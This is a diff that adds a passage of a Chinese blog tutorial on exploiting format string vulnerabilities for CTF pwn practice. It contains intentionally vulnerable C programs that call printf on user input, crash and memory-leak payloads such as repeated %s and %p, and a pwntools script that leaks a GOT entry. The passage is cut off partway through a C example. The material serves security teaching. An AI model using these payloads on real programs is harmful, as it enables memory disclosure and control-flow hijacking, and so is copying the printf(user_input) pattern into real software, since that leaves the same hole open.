@@ -1,0 +1,888 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>PWN入门（格式化字符串漏洞） | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式    函数 基本介绍    printf 输出到 stdout   fprintf 输出到指定 FILE 流   vprintf 根据参数列表格式化输出到 stdout   vfprintf 根据参数列表格式化输出到指定 FILE 流   sprintf 输出到字符串   snprintf 输出指定字节数">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN入门（格式化字符串漏洞）">
+<meta property="og:url" content="https://yichen115.github.io/2020/03/21/aedgn4/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式    函数 基本介绍    printf 输出到 stdout   fprintf 输出到指定 FILE 流   vprintf 根据参数列表格式化输出到 stdout   vfprintf 根据参数列表格式化输出到指定 FILE 流   sprintf 输出到字符串   snprintf 输出指定字节数">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1584881426844-4eb92026-1e5c-4dc4-a113-854258f9b8f6.png#align=left&display=inline&height=125&originHeight=125&originWidth=525&size=0&status=done&style=stroke&width=525">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585227398796-15e937f1-ee06-4cae-b47a-1f00167df447.png#align=left&display=inline&height=300&name=image.png&originHeight=389&originWidth=706&size=94591&status=done&style=none&width=544">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229064454-7d99e6b4-dfb5-48b7-ac6c-2dcf2a1a2b70.png#align=left&display=inline&height=431&name=image.png&originHeight=713&originWidth=1154&size=186762&status=done&style=stroke&width=697">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229574564-bd35bc09-ba4d-4aa4-925e-4d996adb64f0.png#align=left&display=inline&height=454&name=image.png&originHeight=708&originWidth=1123&size=207129&status=done&style=stroke&width=720">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229904431-8e2d648a-0645-4722-9814-6372bc62db3d.png#align=left&display=inline&height=470&name=image.png&originHeight=709&originWidth=726&size=149862&status=done&style=none&width=481">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585230546771-a92178c9-7490-444c-8e93-863fcfe97c71.png#align=left&display=inline&height=480&name=image.png&originHeight=710&originWidth=729&size=149912&status=done&style=none&width=493">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585230870018-5501de06-919f-4248-83a0-ba2baa0f6b15.png#align=left&display=inline&height=501&name=image.png&originHeight=761&originWidth=731&size=155390&status=done&style=none&width=481">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585293421106-806bcc27-062e-4cc7-ae5f-cfe723e3e4ea.png#align=left&display=inline&height=129&name=image.png&originHeight=152&originWidth=609&size=38244&status=done&style=none&width=517">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585295351751-a9f3d3b6-4eaa-4840-a392-ace6fddeaad0.png#align=left&display=inline&height=151&name=image.png&originHeight=178&originWidth=624&size=40188&status=done&style=none&width=531">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585750231946-e351aa8c-3ebc-4b7c-9205-292ee2ffb3d9.png#align=left&display=inline&height=363&name=image.png&originHeight=725&originWidth=1267&size=229503&status=done&style=none&width=633.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585314095222-b26d67ae-9cc9-48c3-b570-116018b80384.png#align=left&display=inline&height=129&name=image.png&originHeight=156&originWidth=726&size=40573&status=done&style=none&width=602">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585751018729-f22847f5-267c-4ba3-bd54-fd1a3c9c6331.png#align=left&display=inline&height=93&name=image.png&originHeight=185&originWidth=631&size=42834&status=done&style=none&width=315.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585835169146-4d95d935-c626-4658-b3b5-eec48feb8115.png#align=left&display=inline&height=103&name=image.png&originHeight=71&originWidth=407&size=8489&status=done&style=none&width=593">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585960844488-98e19bbf-06b5-435e-bd88-a17ae178da20.png#align=left&display=inline&height=456&name=image.png&originHeight=747&originWidth=805&size=67066&status=done&style=stroke&width=491">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586746084050-32cfc97b-b64f-4fcc-ba58-ba7d026b21fc.png#align=left&display=inline&height=377&name=image.png&originHeight=755&originWidth=726&size=187706&status=done&style=none&width=363">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585908267728-45389bdd-1aaa-4936-85ed-324333b84a2a.png#align=left&display=inline&height=293&name=image.png&originHeight=411&originWidth=728&size=90634&status=done&style=stroke&width=519">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585960998051-435e1511-c845-48da-bb00-5d2dc8e765d2.png#align=left&display=inline&height=204&name=image.png&originHeight=262&originWidth=548&size=21186&status=done&style=stroke&width=427">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585961032714-1b549c04-d735-4b13-bb77-4174fe753d80.png#align=left&display=inline&height=202&name=image.png&originHeight=180&originWidth=327&size=9092&status=done&style=stroke&width=367">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963611414-8c37e46f-7e7d-46da-951a-ed8945cee40e.png#align=left&display=inline&height=84&name=image.png&originHeight=109&originWidth=610&size=21950&status=done&style=none&width=469">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963664035-5f8c93a1-e431-4a66-b7a0-bbb31e442d47.png#align=left&display=inline&height=267&name=image.png&originHeight=267&originWidth=304&size=12367&status=done&style=stroke&width=304">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1585963745718-199e9fea-bf4f-43d3-9b10-607be214b432.png#align=left&display=inline&height=350&name=image.png&originHeight=409&originWidth=610&size=26050&status=done&style=stroke&width=522">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586166998602-41052520-78d2-4b14-b174-fdb35d04bf22.png#align=left&display=inline&height=627&name=image.png&originHeight=881&originWidth=725&size=186532&status=done&style=none&width=516">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586167067004-e42aa4a6-8ec9-4de3-93cd-9d8712ad34c2.png#align=left&display=inline&height=403&name=image.png&originHeight=563&originWidth=727&size=121047&status=done&style=none&width=520">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586180859453-774f6e2f-ad26-49cf-a7fb-7277a4f61bcf.png#align=left&display=inline&height=167&name=image.png&originHeight=238&originWidth=701&size=21043&status=done&style=stroke&width=492">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586250033318-401bf7ea-c7ce-47ad-95a1-d90e6f24f48a.png#align=left&display=inline&height=528&name=image.png&originHeight=830&originWidth=725&size=162317&status=done&style=none&width=461">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1586263648762-59759242-56cb-46d7-aedc-1b1f5caadabc.png#align=left&display=inline&height=401&name=image.png&originHeight=435&originWidth=307&size=37058&status=done&style=none&width=283">
+<meta property="article:published_time" content="2020-03-21T07:40:49.000Z">
+<meta property="article:modified_time" content="2020-08-03T02:52:12.930Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1584881426844-4eb92026-1e5c-4dc4-a113-854258f9b8f6.png#align=left&display=inline&height=125&originHeight=125&originWidth=525&size=0&status=done&style=stroke&width=525">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">PWN入门（格式化字符串漏洞）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">PWN入门（格式化字符串漏洞）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-03-21T07:40:49.000Z" itemprop="datePublished" class="page-time">
+  2020-03-21
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞原理利用"><span class="post-toc-number">1.</span> <span class="post-toc-text">漏洞原理利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#程序崩溃"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">程序崩溃</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄露内存"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">泄露内存</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄露任意地址的内存"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">泄露任意地址的内存</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#覆盖栈内存"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">覆盖栈内存</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#覆盖任意地址内存"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">覆盖任意地址内存</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#覆盖小数字"><span class="post-toc-number">1.5.1.</span> <span class="post-toc-text">覆盖小数字</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#覆盖大数字"><span class="post-toc-number">1.5.2.</span> <span class="post-toc-text">覆盖大数字</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#x64-例题"><span class="post-toc-number">2.</span> <span class="post-toc-text">x64 例题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#UIUCTF-pwn200-GoodLuck"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">UIUCTF pwn200 GoodLuck</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#hijack-GOT"><span class="post-toc-number">3.</span> <span class="post-toc-text">hijack GOT</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#2016-CCTF-pwn3"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">2016 CCTF pwn3</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#hijack-retaddr"><span class="post-toc-number">4.</span> <span class="post-toc-text">hijack retaddr</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#三个白帽-pwnme-k0"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">三个白帽 - pwnme_k0</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#格式化字符串盲打"><span class="post-toc-number">5.</span> <span class="post-toc-text">格式化字符串盲打</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#fmt-blind-stack"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">fmt_blind_stack</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#blind-fmt-got"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">blind_fmt_got</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-aedgn4"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">PWN入门（格式化字符串漏洞）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-03-21 15:40:49" datetime="2020-03-21T07:40:49.000Z"  itemprop="datePublished">2020-03-21</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>格式化字符串函数：格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式</p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>printf</td>
+<td>输出到 stdout</td>
+</tr>
+<tr>
+<td>fprintf</td>
+<td>输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>vprintf</td>
+<td>根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td>vfprintf</td>
+<td>根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td>sprintf</td>
+<td>输出到字符串</td>
+</tr>
+<tr>
+<td>snprintf</td>
+<td>输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td>vsprintf</td>
+<td>根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td>vsnprintf</td>
+<td>根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td>setproctitle</td>
+<td>设置 argv</td>
+</tr>
+<tr>
+<td>syslog</td>
+<td>输出日志</td>
+</tr>
+<tr>
+<td>err, verr, warn, vwarn 等</td>
+<td>。。。</td>
+</tr>
+</tbody></table>
+<p>用 printf() 为例，它的第一个参数就是格式化字符串 ：”Color %s,Number %d,Float %4.2f”<br>然后 printf 函数会根据这个格式化字符串来解析对应的其他参数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1584881426844-4eb92026-1e5c-4dc4-a113-854258f9b8f6.png#align=left&display=inline&height=125&originHeight=125&originWidth=525&size=0&status=done&style=stroke&width=525" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<blockquote>
+<p>%d - 十进制 - 输出十进制整数<br>%s - 字符串 - 从内存中读取字符串<br>%x - 十六进制 - 输出十六进制数<br>%c - 字符 - 输出字符<br>%p - 指针 - 指针地址<br>%n - 到目前为止所写的字符数</p>
+</blockquote>
+<h1 id="漏洞原理利用"><a href="#漏洞原理利用" class="headerlink" title="漏洞原理利用"></a>漏洞原理利用</h1><h2 id="程序崩溃"><a href="#程序崩溃" class="headerlink" title="程序崩溃"></a>程序崩溃</h2><p>这种攻击方法最简单，只需要输入一串 %s  就可以<br>%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</p>
+<p>对于每一个 %s，printf()  都会从栈上取一个数字，把该数字视为地址，然后打印出该地址指向的内存内容，由于不可能获取的每一个数字都是地址，所以数字对应的内容可能不存在，或者这个地址是被保护的，那么便会使程序崩溃</p>
+<p><strong>在 Linux 中，存取无效的指针会引起进程收到 SIGSEGV 信号，从而使程序非正常终止并产生核心转储</strong></p>
+<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译一下：<code>gcc -m32 -fno-stack-protector -no-pie -o fs1 1.c</code></p>
+<p>在  printf  函数上面下个断点，然后 r  运行，输入 %08x.%08x.%08x</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585227398796-15e937f1-ee06-4cae-b47a-1f00167df447.png#align=left&display=inline&height=300&name=image.png&originHeight=389&originWidth=706&size=94591&status=done&style=none&width=544" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以看一下此时的栈空间</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229064454-7d99e6b4-dfb5-48b7-ac6c-2dcf2a1a2b70.png#align=left&display=inline&height=431&name=image.png&originHeight=713&originWidth=1154&size=186762&status=done&style=stroke&width=697" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以来看一下栈上的地址</p>
+<p>首先是红色的，这是  printf  的返回地址，然后是那一串绿色的，可以看到这后面是之前的一串 %08x.%08x.%08x.%s\n  这是  printf  函数的第一个参数：格式化字符串，printf  函数会根据这个字符串来解析后面的参数</p>
+<p>第一个 %08x 解析的是 0x1，也就是源码里面的 a，第二个 %08x  解析的是 0x22222222，peda 显示的有些问题，但是通过 x/wx 0xffffce18  看出来的确实是之前源码里面的 b，第三个 %08x  解析的是 0xffffffff，也就是参数 c：-1，后面的 %s  会把我们输入的内容，也就是 %08x.%08x.%08x  给打印出来</p>
+<p>我们执行 c  让程序继续运行，看一下结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229574564-bd35bc09-ba4d-4aa4-925e-4d996adb64f0.png#align=left&display=inline&height=454&name=image.png&originHeight=708&originWidth=1123&size=207129&status=done&style=stroke&width=720" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>结果跟我们想的一样，同时程序断在了第二个  printf  这里，把我们之前输入的内容作为   格式化字符串，但是这一次没有给他提供其他的参数，但是他同样会在栈上找临近的三个参数，根据 格式化字符串 给打印出来，这样就把他后面三个栈上的值给输出出来了</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585229904431-8e2d648a-0645-4722-9814-6372bc62db3d.png#align=left&display=inline&height=470&name=image.png&originHeight=709&originWidth=726&size=149862&status=done&style=none&width=481" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>但是上面的都是获取临近的内容进行输出，我们不可能只要这几个东西，可以通过 %n$x  来获取被视作第 n+1 个参数的值（格式化字符串是第一个参数）</p>
+<p>那上个例子来说，如果使用 %3$x  就会打印出第四个参数对应的值</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585230546771-a92178c9-7490-444c-8e93-863fcfe97c71.png#align=left&display=inline&height=480&name=image.png&originHeight=710&originWidth=729&size=149912&status=done&style=none&width=493" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>另外也可以通过 %s  来获取栈变量对应的字符串</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585230870018-5501de06-919f-4248-83a0-ba2baa0f6b15.png#align=left&display=inline&height=501&name=image.png&originHeight=761&originWidth=731&size=155390&status=done&style=none&width=481" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>小技巧总结</p>
+<blockquote>
+<p>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别<br>利用 %s 来获取变量所对应地址的内容，只不过有零截断<br>利用 %n$x 来获取指定参数的值，利用 %n$s 来获取指定参数对应地址的内容</p>
+</blockquote>
+<h2 id="泄露任意地址的内存"><a href="#泄露任意地址的内存" class="headerlink" title="泄露任意地址的内存"></a>泄露任意地址的内存</h2><p>之前的方法还只是泄露栈上变量值，没法泄露变量的地址，但是如果我们知道格式化字符串在输出函数调用时是第几个参数，这里假设格式化字符串相对函数调用是第 k 个参数，那我们就可以通过如下方法来获取指定地址 addr 的内容 <code>addr%k$x</code></p>
+<p>下面就是确定格式化字符串是第几个参数了，一般可以通过 [tag]%p%p%p%p%p%p%p%p%p 来实现，如果输出的内容跟我们前面的 tag 重复了，那就说明我们找到了，但是不排除栈上有些其他变量也是这个值，所以可以用一些其他的字符进行再次尝试</p>
+<p>比如之前那个例子，输入：AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585293421106-806bcc27-062e-4cc7-ae5f-cfe723e3e4ea.png#align=left&display=inline&height=129&name=image.png&originHeight=152&originWidth=609&size=38244&status=done&style=none&width=517" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>AAAA 对应后面到 0x41414141，也就是格式化字符串的第四个参数</p>
+<p>当然这也可以用 AAAA%4$p 来达到同样的效果，通过这种方法，如果我们传入的是 一个函数的 GOT 地址，那么他就可以给我们打印出来函数在内存中的真实地址</p>
+<p>使用 objdump -R fs1 查看一下 got 表</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585295351751-a9f3d3b6-4eaa-4840-a392-ace6fddeaad0.png#align=left&display=inline&height=151&name=image.png&originHeight=178&originWidth=624&size=40188&status=done&style=none&width=531" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>通过这段代码，可以把 scanf 的地址给打印出来，%s 是把地址指向的内存内容给打印出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./fs1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fs1'</span>)</span><br><span class="line">__isoc99_scanf_got = elf.got[<span class="string">'__isoc99_scanf'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(__isoc99_scanf_got)</span><br><span class="line">payload = p32(__isoc99_scanf_got) + <span class="string">'%4$s'</span></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'%4$s\n'</span>)</span><br><span class="line"><span class="keyword">print</span> hex(u32(sh.recv()[<span class="number">4</span>:<span class="number">8</span>]))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1585750231946-e351aa8c-3ebc-4b7c-9205-292ee2ffb3d9.png#align=left&display=inline&height=363&name=image.png&originHeight=725&originWidth=1267&size=229503&status=done&style=none&width=633.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>需要注意的是不能直接在命令行输入  \x14\xa0\x0%4$s 否则 scanf 会把它识别成：\，x，1，4….</p>
+<h2 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h2><p>%n，不输出字符，但是把已经成功输入的字符个数写入对应的整型指针参数所指的变量<br>只要变量对应的地址可写，就可以利用格式化字符串来改变其对应的值</p>
+<p>一般来说，利用分为以下的步骤：</p>
+<ul>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span 